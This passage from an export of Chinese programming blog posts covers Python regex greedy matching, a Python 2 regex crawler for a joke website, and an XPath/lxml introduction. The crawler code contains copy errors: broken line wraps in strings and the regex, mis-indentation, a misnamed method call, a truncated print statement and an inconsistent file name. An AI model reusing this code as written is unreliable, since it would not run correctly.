id=\"匹配中文\">匹配中文</h2>\n\n<p>在某些情况下，我们想匹配文本中的汉字，有一点需要注意的是，中文的 unicode 编码范围 主要在 [u4e00-u9fa5]，这里说主要是因为这个范围并不完整，比如没有包括全角（中文）标点，不过，在大部分情况下，应该是够用的。</p>\n\n<p>假设现在想把字符串 title = u'你好，hello，世界' 中的中文提取出来，可以这么做：</p>\n\n<pre class=\"has\">\n<code>import re\n\ntitle = u'你好，hello，世界'\npattern = re.compile(ur'[\\u4e00-\\u9fa5]+')\nresult = pattern.findall(title)\n\nprint result\n</code></pre>\n\n<p>注意到，我们在正则表达式前面加上了两个前缀 ur，其中 r 表示使用原始字符串，u 表示是 unicode 字符串。</p>\n\n<p>执行结果:</p>\n\n<pre class=\"has\">\n<code>[u'\\u4f60\\u597d', u'\\u4e16\\u754c']\n</code></pre>\n\n<h2 id=\"注意：贪婪模式与非贪婪模式\">注意：贪婪模式与非贪婪模式</h2>\n\n<ol><li>贪婪模式：在整个表达式匹配成功的前提下，尽可能多的匹配 ( * )；</li>\n\t<li>非贪婪模式：在整个表达式匹配成功的前提下，尽可能少的匹配 ( ? )；</li>\n\t<li><strong>Python里数量词默认是贪婪的。</strong></li>\n</ol><h3 id=\"示例一-：-源字符串：abbbc\">示例一 ： 源字符串：<code>abbbc</code></h3>\n\n<ul><li>使用贪婪的数量词的正则表达式 <code>ab*</code> ，匹配结果： abbb。\n\n\t<blockquote>\n\t<p><code>*</code> 决定了尽可能多匹配 b，所以a后面所有的 b 都出现了。</p>\n\t</blockquote>\n\t</li>\n</ul><ul><li>使用非贪婪的数量词的正则表达式<code>ab*?</code>，匹配结果： a。\n\n\t<blockquote>\n\t<p>即使前面有 <code>*</code>，但是 <code>?</code> 决定了尽可能少匹配 b，所以没有 b。</p>\n\t</blockquote>\n\t</li>\n</ul><h3 id=\"示例二-：-源字符串：aadivtest1divbbdivtest2divcc\">示例二 ： 源字符串：<code>aa&lt;div&gt;test1&lt;/div&gt;bb&lt;div&gt;test2&lt;/div&gt;cc</code></h3>\n\n<ul><li>\n\t<p>使用贪婪的数量词的正则表达式：<code>&lt;div&gt;.*&lt;/div&gt;</code></p>\n\t</li>\n\t<li>\n\t<p>匹配结果：<code>&lt;div&gt;test1&lt;/div&gt;bb&lt;div&gt;test2&lt;/div&gt;</code></p>\n\t</li>\n</ul><blockquote>\n<p>这里采用的是贪婪模式。在匹配到第一个“<code>&lt;/div&gt;</code>”时已经可以使整个表达式匹配成功，但是由于采用的是贪婪模式，所以仍然要向右尝试匹配，查看是否还有更长的可以成功匹配的子串。匹配到第二个“<code>&lt;/div&gt;</code>”后，向右再没有可以成功匹配的子串，匹配结束，匹配结果为“<code>&lt;div&gt;test1&lt;/div&gt;bb&lt;div&gt;test2&lt;/div&gt;</code>”</p>\n</blockquote>\n\n<hr><ul><li>\n\t<p>使用非贪婪的数量词的正则表达式：<code>&lt;div&gt;.*?&lt;/div&gt;</code></p>\n\t</li>\n\t<li>\n\t<p>匹配结果：<code>&lt;div&gt;test1&lt;/div&gt;</code></p>\n\t</li>\n</ul><blockquote>\n<p>正则表达式二采用的是非贪婪模式，在匹配到第一个“<code>&lt;/div&gt;</code>”时使整个表达式匹配成功，由于采用的是非贪婪模式，所以结束匹配，不再向右尝试，匹配结果为“<code>&lt;div&gt;test1&lt;/div&gt;</code>”。</p>\n</blockquote>\n\n<p><a href=\"http://tool.oschina.net/regex/\" rel=\"nofollow\">正则表达式测试网址</a></p>\n                                    </div>", "log_PostTime": 1584891193, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python案例：使用正则表达式的爬虫", "log_Intro": "Python案例：使用正则表达式的爬虫", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"案例：使用正则表达式的爬虫\">案例：使用正则表达式的爬虫</h1>\n\n<p>现在拥有了正则表达式这把神兵利器，我们就可以进行对爬取到的全部网页源代码进行筛选了。</p>\n\n<p>下面我们一起尝试一下爬取内涵段子网站： <a href=\"http://www.neihan8.com/article/list_5_1.html\" rel=\"nofollow\">http://www.neihan8.com/article/list_5_1.html</a></p>\n\n<p>打开之后，不难看到里面一个一个灰常有内涵的段子，当你进行翻页的时候，注意url地址的变化：</p>\n\n<ul><li>\n\t<p>第一页url: http: //www.neihan8.com/article/list_5_1 .html</p>\n\t</li>\n\t<li>\n\t<p>第二页url: http: //www.neihan8.com/article/list_5_2 .html</p>\n\t</li>\n\t<li>\n\t<p>第三页url: http: //www.neihan8.com/article/list_5_3 .html</p>\n\t</li>\n\t<li>\n\t<p>第四页url: http: //www.neihan8.com/article/list_5_4 .html</p>\n\t</li>\n</ul><p>这样我们的url规律找到了，要想爬取所有的段子，只需要修改一个参数即可。 下面我们就开始一步一步将所有的段子爬取下来吧。</p>\n\n<hr><h1 id=\"第一步：获取数据\">第一步：获取数据</h1>\n\n<p>1. 按照我们之前的用法，我们需要写一个加载页面的方法。</p>\n\n<p>这里我们统一定义一个类，将url请求作为一个成员方法处理。</p>\n\n<p>我们创建一个文件，叫duanzi_spider.py</p>\n\n<p>然后定义一个Spider类，并且添加一个加载页面的成员方法</p>\n\n<pre class=\"has\">\n<code>import urllib2\n\nclass Spider:\n    \"\"\"\n        内涵段子爬虫类\n    \"\"\"\n    def loadPage(self, page):\n        \"\"\"\n            @brief 定义一个url请求网页的方法\n            @param page 需要请求的第几页\n            @returns 返回的页面html\n        \"\"\"\n\n    url = \"http://www.neihan8.com/article/list_5_\" + str(page)\n+ \".html\"\n    #User-Agent头\n    user_agent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT\n6.1; Trident/5.0'\n\n    headers = {'User-Agent': user_agent}\n    req = urllib2.Request(url, headers = headers)\n    response = urllib2.urlopen(req)\n    html = response.read()\n    print html\n\n    #return html\n</code></pre>\n\n<p><strong>以上的loadPage的实现体想必大家应该很熟悉了，需要注意定义python类的成员方法需要额外添加一个参数<code>self</code>.</strong></p>\n\n<ul><li>\n\t<p>那么loadPage(self, page) 中的page是我们指定去请求第几页。</p>\n\t</li>\n\t<li>\n\t<p>最后通过 print html打印到屏幕上。</p>\n\t</li>\n\t<li>\n\t<p>然后我们写一个main函数见到测试一个loadPage方法</p>\n\t</li>\n</ul><p>2. 写main函数测试一个loadPage方法</p>\n\n<pre class=\"has\">\n<code>if __name__ == '__main__':\n    \"\"\"\n        ======================\n            内涵段子小爬虫\n        ======================\n    \"\"\"\n    print '请按下回车开始'\n    raw_input()\n\n    #定义一个Spider对象\n    mySpider = Spider()\n    mySpider.loadpage(1)\n</code></pre>\n\n<ul><li>\n\t<p>程序正常执行的话，我们会在屏幕上打印了内涵段子第一页的全部html代码。 但是我们发现，html中的中文部分显示的可能是乱码 。</p>\n\t</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023182831184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p>那么我们需要简单的将得到的网页源代码处理一下：</p>\n\n<pre class=\"has\">\n<code>\ndef loadPage(self, page):\n    \"\"\"\n        @brief 定义一个url请求网页的方法\n        @param page 需要请求的第几页\n        @returns 返回的页面html\n    \"\"\"\n\n    url = \"http://www.neihan8.com/article/list_5_\" + str(page)\n+ \".html\"\n    #User-Agent头\n    user_agent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT\n6.1; Trident/5.0'\n    headers = {'User-Agent': user_agent}\n    req = urllib2.Request(url, headers = headers)\n    response = urllib2.urlopen(req)\n    html = response.read()\n    gbk_html = html.decode('gbk').encode('utf-8')\n    # print gbk_html\n    return gbk_html\n</code></pre>\n\n<blockquote>\n<p>注意 ：对于每个网站对中文的编码各自不同，所以html.decode(‘gbk’)的写法并不是通用写法，根据网站的编码而异</p>\n</blockquote>\n\n<ul><li>\n\t<p>这样我们再次执行以下duanzi_spider.py ，会发现之前的中文乱码可以正常显示了。</p>\n\n\t<p> </p>\n\t</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023182848395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<h1 id=\"第二步：筛选数据\">第二步：筛选数据</h1>\n\n<blockquote>\n<p>接下来我们已经得到了整个页面的数据。 但是，很多内容我们并不关心，所以下一步我们需要进行筛选。 如何筛选，就用到了上一节讲述的正则表达式。</p>\n</blockquote>\n\n<ul><li>首先</li>\n</ul><pre class=\"has\">\n<code>import re\n</code></pre>\n\n<ul><li>然后, 在我们得到的<code>gbk_html</code>中进行筛选匹配。</li>\n</ul><p>我们需要一个匹配规则:</p>\n\n<blockquote>\n<p>我们可以打开内涵段子的网页，鼠标点击右键 “ 查看源代码 ” 你会惊奇的发现，我们需要的每个段子的内容都是在一个 <code>&lt;div&gt;</code>标签中，而且每个<code>div</code>都有一个属性<code>class = \"f18 mb20\"</code></p>\n</blockquote>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023182907652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<blockquote>\n<p>所以，我们只需要匹配到网页中所有<code>&lt;div class=\"f18 mb20\"&gt;</code> 到 <code>&lt;/div&gt;</code> 的数据就可以了。</p>\n</blockquote>\n\n<p>根据正则表达式，我们可以推算出一个公式是:</p>\n\n<p><code>&lt;div.*?class=\"f18 mb20\"&gt;(.*?)&lt;/div&gt;</code></p>\n\n<ul><li>\n\t<p>这个表达式实际上就是匹配到所有<code>div</code>中<code>class=\"f18 mb20</code> 里面的内容(具体可以看前面正则介绍)</p>\n\t</li>\n\t<li>\n\t<p>然后将这个正则应用到代码中，我们会得到以下代码：</p>\n\t</li>\n</ul><pre class=\"has\">\n<code>def loadPage(self, page):\n    \"\"\"\n        @brief 定义一个url请求网页的方法\n        @param page 需要请求的第几页\n        @returns 返回的页面html\n    \"\"\"\n\n    url = \"http://www.neihan8.com/article/list_5_\" + str(page)\n+ \".html\"\n    #User-Agent头\n    user_agent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT\n6.1; Trident/5.0'\n    headers = {'User-Agent': user_agent}\n    req = urllib2.Request(url, headers = headers)\n    response = urllib2.urlopen(req)\n    html = response.read()\n    gbk_html = html.decode('gbk').encode('utf-8')\n\n    #找到所有的段子内容&lt;div class = \"f18 mb20\"&gt;&lt;/div&gt;\n    #re.S 如果没有re.S 则是只匹配一行有没有符合规则的字符串，如果没有则下一行重新匹配\n    # 如果加上re.S 则是将所有的字符串将一个整体进行匹配\n    pattern = re.compile(r'&lt;div.*?class=\"f18 mb20\"&gt;(.*?)&lt;/di\nv&gt;', re.S)\n    item_list = pattern.findall(gbk_html)\n\n    return item_list\n\n\ndef printOnePage(self, item_list, page):\n    \"\"\"\n        @brief 处理得到的段子列表\n        @param item_list 得到的段子列表\n        @param page 处理第几页\n    \"\"\"\n\n    print \"******* 第 %d 页 爬取完毕...*******\" %page\n    for item in item_list:\n        print \"================\"\n        print ite\n</code></pre>\n\n<blockquote>\n<ul><li>\n\t<p>这里需要注意一个是<code>re.S</code>是正则表达式中匹配的一个参数。</p>\n\t</li>\n\t<li>\n\t<p>如果 没有re.S 则是 只匹配一行 有没有符合规则的字符串，如果没有则下一行重新匹配。</p>\n\t</li>\n\t<li>如果 加上re.S 则是将 所有的字符串 将一个整体进行匹配，findall 将所有匹配到的结果封装到一个list中。</li>\n</ul></blockquote>\n\n<ul><li>然后我们写了一个遍历<code>item_list</code>的一个方法 <code>printOnePage()</code> 。 ok程序写到这，我们再一次执行一下。</li>\n</ul><pre class=\"has\">\n<code>Power@PowerMac ~$ python duanzi_spider.py\n</code></pre>\n\n<p>我们第一页的全部段子，不包含其他信息全部的打印了出来。</p>\n\n<ul><li>你会发现段子中有很多 <code>&lt;p&gt;</code> , <code>&lt;/p&gt;</code> 很是不舒服，实际上这个是html的一种段落的标签。</li>\n\t<li>\n\t<p>在浏览器上看不出来，但是如果按照文本打印会有<code>&lt;p&gt;</code>出现，那么我们只需要把我们不希望的内容去掉即可了。</p>\n\t</li>\n\t<li>\n\t<p>我们可以如下简单修改一下 printOnePage().</p>\n\t</li>\n</ul><pre class=\"has\">\n<code>def printOnePage(self, item_list, page):\n    \"\"\"\n        @brief 处理得到的段子列表\n        @param item_list 得到的段子列表\n        @param page 处理第几页\n    \"\"\"\n\n    print \"******* 第 %d 页 爬取完毕...*******\" %page\n    for item in item_list:\n        print \"================\"\n        item = item.replace(\"&lt;p&gt;\", \"\").replace(\"&lt;/p&gt;\", \"\").repl\nace(\"&lt;br /&gt;\", \"\")\n        print item\n</code></pre>\n\n<hr><h1 id=\"第三步：保存数据\">第三步：保存数据</h1>\n\n<ul><li>我们可以将所有的段子存放在文件中。比如，我们可以将得到的每个item不是打印出来，而是存放在一个叫 duanzi.txt 的文件中也可以。</li>\n</ul><pre class=\"has\">\n<code>def writeToFile(self, text):\n'''\n    @brief 将数据追加写进文件中\n    @param text 文件内容\n'''\n    myFile = open(\"./duanzi.txt\", 'a') #追加形式打开文件\n    myFile.write(text)\n    myFile.write(\"---------------------------------------------\n--------\")\n    myFile.close()\n</code></pre>\n\n<ul><li>然后我们将print的语句 改成<code>writeToFile()</code> ，当前页面的所有段子就存在了本地的MyStory.txt文件中。</li>\n</ul><pre class=\"has\">\n<code>def printOnePage(self, item_list, page):\n'''\n    @brief 处理得到的段子列表\n    @param item_list 得到的段子列表\n    @param page 处理第几页\n'''\n    print \"******* 第 %d 页 爬取完毕...*******\" %page\n    for item in item_list:\n        # print \"================\"\n        item = item.replace(\"&lt;p&gt;\", \"\").replace(\"&lt;/p&gt;\", \"\").repl\nace(\"&lt;br /&gt;\", \"\")\n        # print item\n        self.writeToFile(item)\n</code></pre>\n\n<h1 id=\"第四步：显示数据\">第四步：显示数据</h1>\n\n<ul><li>\n\t<p>接下来我们就通过参数的传递对page进行叠加来遍历 内涵段子吧的全部段子内容。</p>\n\t</li>\n\t<li>\n\t<p>只需要在外层加一些逻辑处理即可。</p>\n\t</li>\n</ul><pre class=\"has\">\n<code>def doWork(self):\n'''\n    让爬虫开始工作\n'''\n    while self.enable:\n        try:\n            item_list = self.loadPage(self.page)\n        except urllib2.URLError, e:\n            print e.reason\n            continue\n\n        #对得到的段子item_list处理\n        self.printOnePage(item_list, self.page)\n        self.page += 1 #此页处理完毕，处理下一页\n        print \"按回车继续...\"\n        print \"输入 quit 退出\"\n        command = raw_input()\n        if (command == \"quit\"):\n            self.enable = False\n            break\n</code></pre>\n\n<blockquote>\n<ul><li>最后，我们执行我们的代码，完成后查看当前路径下的duanzi.txt文件，里面已经有了我们要的内涵段子。</li>\n</ul></blockquote>\n\n<p><strong>以上便是一个非常精简使用的小爬虫程序，使用起来很是方便，如果想要爬取其他网站的信息，只需要修改其中某些参数和一些细节就行了。</strong></p>\n                                    </div>", "log_PostTime": 1584891194, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python:XPath与lxml类库", "log_Intro": "Python:XPath与lxml类库", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"什么是xml\">什么是XML</h2>\n\n<ul><li>XML 指可扩展标记语言（EXtensible Markup Language）</li>\n\t<li>XML 是一种标记语言，很类似 HTML</li>\n\t<li>XML 的设计宗旨是传输数据，而非显示数据</li>\n\t<li>XML 的标签需要我们自行定义。</li>\n\t<li>XML 被设计为具有自我描述性。</li>\n\t<li>XML 是 W3C 的推荐标准</li>\n</ul><p>W3School官方文档：<a href=\"http://www.w3school.com.cn/xml/index.asp\" rel=\"nofollow\">http://www.w3school.com.cn/xml/index.asp</a></p>\n\n<p>XML 和 HTML 的区别</p>\n\n<table><thead><tr><th>数据格式</th>\n\t\t\t<th>描述</th>\n\t\t\t<th>设计目标</th>\n\t\t</tr></thead><tbody><tr><td>XML</td>\n\t\t\t<td>Extensible Markup Language <code>（可扩展标记语言）</code></td>\n\t\t\t<td>被设计为传输和存储数据，其焦点是数据的内容。</td>\n\t\t</tr><tr><td>HTML</td>\n\t\t\t<td>HyperText Markup Language <code>（超文本标记语言）</code></td>\n\t\t\t<td>显示数据以及如何更好显示数据。</td>\n\t\t</tr><tr><td>HTML DOM</td>\n\t\t\t<td>Document Object Model for HTML <code>(文档对象模型)</code></td>\n\t\t\t<td>通过 HTML DOM，可以访问所有的 HTML 元素，连同它们所包含的文本和属性。可以对其中的内容进行修改和删除，同时也可以创建新的元素。</td>\n\t\t</tr></tbody></table><p>XML文档示例</p>\n\n<pre class=\"has\">\n<code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;bookstore&gt; \n\n  &lt;book category=\"cooking\"&gt; \n    &lt;title lang=\"en\"&gt;Everyday Italian&lt;/title&gt;  \n    &lt;author&gt;Giada De Laurentiis&lt;/author&gt;  \n    &lt;year&gt;2005&lt;/year&gt;  \n    &lt;price&gt;30.00&lt;/price&gt; \n  &lt;/book&gt;  \n\n  &lt;book category=\"children\"&gt; \n    &lt;title lang=\"en\"&gt;Harry Potter&lt;/title&gt;  \n    &lt;author&gt;J K. Rowling&lt;/author&gt;  \n    &lt;year&gt;2005&lt;/year&gt;  \n    &lt;price&gt;29.99&lt;/price&gt; \n  &lt;/book&gt;  \n\n  &lt;book category=\"web\"&gt; \n    &lt;title lang=\"en\"&gt;XQuery Kick Start&lt;/title&gt;  \n    &lt;author&gt;James McGovern&lt;/author&gt;  \n    &lt;author&gt;Per Bothner&lt;/author&gt;  \n    &lt;author&gt;Kurt Cagle&lt;/author&gt;  \n    &lt;author&gt;James Linn&lt;/author&gt;  \n    &lt;author&gt;Vaidyanathan Nagarajan&lt;/author&gt;  \n    &lt;year&gt;2003&lt;/year&gt;  \n    &lt;price&gt;49.99&lt;/price&gt; \n  &lt;/book&gt; \n\n  &lt;book category=\"web\" cover=\"paperback\"&gt; \n    &lt;title lang=\"en\"&gt;Learning XML&lt;/title&gt;  \n    &lt;author&gt;Erik T. Ray&lt;/author&gt;  \n    &lt;year&gt;2003&lt;/year&gt;  \n    &lt;price&gt;39.95&lt;/price&gt; \n  &lt;/book&gt; \n\n&lt;/bookstore&gt;\n</code></pre>\n\n<p>HTML DOM 模型示例</p>\n\n<p>HTML DOM 定义了访问和操作 HTML 文档的标准方法，以树结构方式表达 HTML 文档。</p>\n\n<p><img alt=\"\" class=\"has\" height=\"266\" src=\"https://img-blog.csdnimg.cn/20191023183649885.gif\" width=\"486\"></p>\n\n<p> </p>\n\n<hr><h3 id=\"xml的节点关系\">XML的节点关系</h3>\n\n<p>1. 父（Parent）</p>\n\n<p>每个元素以及属性都有一个父。</p>\n\n<p>下面是一个简单的XML例子中，book 元素是 title、author、year 以及 price 元素的父：</p>\n\n<pre class=\"has\">\n<code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;book&gt;\n  &lt;title&gt;Harry Potter&lt;/title&gt;\n  &lt;author&gt;J K. Rowling&lt;/author&gt;\n  &lt;year&gt;2005&lt;/year&gt;\n  &lt;price&gt;29.99&lt;/price&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>2. 子（Children）</p>\n\n<p>元素节点可有零个、一个或多个子。</p>\n\n<p>在下面的例子中，title、author、year 以及 price 元素都是 book 元素的子：</p>\n\n<pre class=\"has\">\n<code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;book&gt;\n  &lt;title&gt;Harry Potter&lt;/title&gt;\n  &lt;author&gt;J K. Rowling&lt;/author&gt;\n  &lt;year&gt;2005&lt;/year&gt;\n  &lt;price&gt;29.99&lt;/price&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>3. 同胞（Sibling）</p>\n\n<p>拥有相同的父的节点</p>\n\n<p>在下面的例子中，title、author、year 以及 price 元素都是同胞：</p>\n\n<pre class=\"has\">\n<code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;book&gt;\n  &lt;title&gt;Harry Potter&lt;/title&gt;\n  &lt;author&gt;J K. Rowling&lt;/author&gt;\n  &lt;year&gt;2005&lt;/year&gt;\n  &lt;price&gt;29.99&lt;/price&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>4. 先辈（Ancestor）</p>\n\n<p>某节点的父、父的父，等等。</p>\n\n<p>在下面的例子中，title 元素的先辈是 book 元素和 bookstore 元素：</p>\n\n<pre class=\"has\">\n<code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;bookstore&gt;\n\n&lt;book&gt;\n  &lt;title&gt;Harry Potter&lt;/title&gt;\n  &lt;author&gt;J K. Rowling&lt;/author&gt;\n  &lt;year&gt;2005&lt;/year&gt;\n  &lt;price&gt;29.99&lt;/price&gt;\n&lt;/book&gt;\n\n&lt;/bookstore&gt;\n</code></pre>\n\n<p>5. 后代（Descendant）</p>\n\n<p>某个节点的子，子的子，等等。</p>\n\n<p>在下面的例子中，bookstore 的后代是 book、title、author、year 以及 price 元素：</p>\n\n<pre class=\"has\">\n<code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;bookstore&gt;\n\n&lt;book&gt;\n  &lt;title&gt;Harry Potter&lt;/title&gt;\n  &lt;author&gt;J K. Rowling&lt;/author&gt;\n  &lt;year&gt;2005&lt;/year&gt;\n  &lt;price&gt;29.99&lt;/price&gt;\n&lt;/book&gt;\n\n&lt;/bookstore&gt;\n</code></pre>\n\n<h2 id=\"什么是xpath？\">什么是XPath？</h2>\n\n<blockquote>\n<p>XPath (XML Path Language) 是一门在 XML 文档中查找信息的语言，可用来在 XML 文档中对元素和属性进行遍历。</p>\n\n<p>W3School官方文档：<a href=\"http://www.w3school.com.cn/xpath/index.asp\" rel=\"nofollow\">http://www.w3school.com.cn/xpath/index.asp</a></p>\n</blockquote>\n\n<h3 id=\"xpath-开发工具\">XPath 开发工具</h3>\n\n<ol><li>开源的XPath表达式编辑工具:XMLQuire(XML格式文件可用)</li>\n\t<li>Chrome插件 XPath Helper</li>\n\t<li>Firefox插件 XPath Checker</li>\n</ol><h3 id=\"选取节点\">选取节点</h3>\n\n<p>XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。</p>\n\n<p>下面列出了最常用的路径表达式：</p>\n\n<table><thead><tr><th>表达式</th>\n\t\t\t<th>描述</th>\n\t\t</tr></thead><tbody><tr><td>nodename</td>\n\t\t\t<td>选取此节点的所有子节点。</td>\n\t\t</tr><tr><td>/</td>\n\t\t\t<td>从根节点选取。</td>\n\t\t</tr><tr><td>//</td>\n\t\t\t<td>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。</td>\n\t\t</tr><tr><td>.</td>\n\t\t\t<td>选取当前节点。</td>\n\t\t</tr><tr><td>..</td>\n\t\t\t<td>选取当前节点的父节点。</td>\n\t\t</tr><tr><td>@</td>\n\t\t\t<td>选取属性。</td>\n\t\t</tr></tbody></table><p>在下面的表格中，我们已列出了一些路径表达式以及表达式的结果：</p>\n\n<table><thead><tr><th> </th>\n\t\t\t<th>路径表达式</th>\n\t\t\t<th>结果</th>\n\t\t</tr></thead><tbody><tr><td>bookstore</td>\n\t\t\t<td>选取 bookstore 元素的所有子节点。</td>\n\t\t</tr><tr><td>/bookstore</td>\n\t\t\t<td>选取根元素 bookstore。注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！</td>\n\t\t</tr><tr><td>bookstore/book</td>\n\t\t\t<td>选取属于 bookstore 的子元素的所有 book 元素。</td>\n\t\t</tr><tr><td>//book</td>\n\t\t\t<td>选取所有 book 子元素，而不管它们在文档中的位置。</td>\n\t\t</tr><tr><td>bookstore//book</td>\n\t\t\t<td>选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。</td>\n\t\t</tr><tr><td>//@lang</td>\n\t\t\t<td>选取名为 lang 的所有属性。</td>\n\t\t</tr></tbody></table><h3 id=\"谓语（predicates）\">谓语（Predicates）</h3>\n\n<p>谓语用来查找某个特定的节点或者包含某个指定的值的节点，被嵌在方括号中。</p>\n\n<p>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p>\n\n<table><thead><tr><th>路径表达式</th>\n\t\t\t<th>结果</th>\n\t\t</tr></thead><tbody><tr><td>/bookstore/book[1]</td>\n\t\t\t<td>选取属于 bookstore 子元素的第一个 book 元素。</td>\n\t\t</tr><tr><td>/bookstore/book[last()]</td>\n\t\t\t<td>选取属于 bookstore 子元素的最后一个 book 元素。</td>\n\t\t</tr><tr><td>/bookstore/book[last()-1]</td>\n\t\t\t<td>选取属于 bookstore 子元素的倒数第二个 book 元素。</td>\n\t\t</tr><tr><td>/bookstore/book[position()&lt;3]</td>\n\t\t\t<td>选取最前面的两个属于 bookstore 元素的子元素的 book 元素。</td>\n\t\t</tr><tr><td>//title[@lang]</td>\n\t\t\t<td>选取所有拥有名为 lang 的属性的 title 元素。</td>\n\t\t</tr><tr><td>//title[@lang=’eng’]</td>\n\t\t\t<td>选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。</td>\n\t\t</tr><tr><td>/bookstore/book[price&gt;35.00]</td>\n\t\t\t<td>选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。</td>\n\t\t</tr><tr><td>/bookstore/book[price&gt;35.00]/title</td>\n\t\t\t<td>选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</td>\n\t\t</tr></tbody></table><h3 id=\"选取未知节点\">选取未知节点</h3>\n\n<p>XPath 通配符可用来选取未知的 XML 元素。</p>\n\n<table><thead><tr><th>通配符</th>\n\t\t\t<th>描述</th>\n\t\t</tr></thead><tbody><tr><td>*</td>\n\t\t\t<td>匹配任何元素节点。</td>\n\t\t</tr><tr><td>@*</td>\n\t\t\t<td>匹配任何属性节点。</td>\n\t\t</tr><tr><td>node()</td>\n\t\t\t<td>匹配任何类型的节点。</td>\n\t\t</tr></tbody></table><p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p>\n\n<table><thead><tr><th>路径表达式</th>\n\t\t\t<th>结果</th>\n\t\t</tr></thead><tbody><tr><td>/bookstore/*</td>\n\t\t\t<td>选取 bookstore 元素的所有子元素。</td>\n\t\t</tr><tr><td>//*</td>\n\t\t\t<td>选取文档中的所有元素。</td>\n\t\t</tr><tr><td>//title[@*]</td>\n\t\t\t<td>选取所有带有属性的 title 元素。</td>\n\t\t</tr></tbody></table><h3 id=\"选取若干路径\">选取若干路径</h3>\n\n<p>通过在路径表达式中使用“|”运算符，您可以选取若干个路径。</p>\n\n<p>实例</p>\n\n<p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p>\n\n<table><thead><tr><th>路径表达式</th>\n\t\t\t<th>结果</th>\n\t\t</tr></thead><tbody><tr><td>//book/title | //book/price</td>\n\t\t\t<td>选取 book 元素的所有 title 和 price 元素。</td>\n\t\t</tr><tr><td>//title | //price</td>\n\t\t\t<td>选取文档中的所有 title 和 price 元素。</td>\n\t\t</tr><tr><td>/bookstore/book/title | //price</td>\n\t\t\t<td>选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。</td>\n\t\t</tr></tbody></table><h3 id=\"xpath的运算符\">XPath的运算符</h3>\n\n<p>下面列出了可用在 XPath 表达式中的运算符：</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023183712537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>这些就是XPath的语法内容，在运用到Python抓取时要先转换为xml。</p>\n\n<h2 id=\"lxml库\">lxml库</h2>\n\n<blockquote>\n<p>lxml 是 一个HTML/XML的解析器，主要的功能是如何解析和提取 HTML/XML 数据。</p>\n\n<p>lxml和正则一样，也是用 C 实现的，是一款高性能的 Python HTML/XML 解析器，我们可以利用之前学习的XPath语法，来快速的定位特定元素以及节点信息。</p>\n\n<p>lxml python 官方文档：<a href=\"http://lxml.de/index.html\" rel=\"nofollow\">http://lxml.de/index.html</a></p>\n\n<p>需要安装C语言库，可使用 pip 安装：<code>pip install lxml</code> （或通过wheel方式安装）</p>\n</blockquote>\n\n<h3 id=\"初步使用\">初步使用</h3>\n\n<p>我们利用它来解析 HTML 代码，简单示例：</p>\n\n<pre class=\"has\">\n<code># lxml_test.py\n\n# 使用 lxml 的 etree 库\nfrom lxml import etree \n\ntext = '''\n&lt;div&gt;\n    &lt;ul&gt;\n         &lt;li class=\"item-0\"&gt;&lt;a href=\"link1.html\"&gt;first item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-1\"&gt;&lt;a href=\"link2.html\"&gt;second item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-inactive\"&gt;&lt;a href=\"link3.html\"&gt;third item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-1\"&gt;&lt;a href=\"link4.html\"&gt;fourth item&lt;/a&gt;&lt;/li&gt;\n         &lt;li class=\"item-0\"&gt;&lt;a 